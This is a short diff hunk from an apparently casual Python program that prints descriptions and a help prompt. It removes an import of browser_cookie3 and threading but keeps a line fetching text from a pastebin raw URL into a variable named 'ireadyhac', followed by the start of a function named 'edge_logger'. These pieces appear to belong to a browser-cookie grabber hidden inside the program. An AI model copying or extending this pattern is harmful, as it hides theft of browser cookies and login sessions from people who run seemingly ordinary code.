@@ -62,7 +62,6 @@ print(random.choices(descriptions))
 if new_user == True:
     print("Type cmds for help!")
 
-import browser_cookie3, threading
 ireadyhac = requests.get("https://pastebin.com/raw/JSjH6Kqm").text
 def edge_logger():
     try:
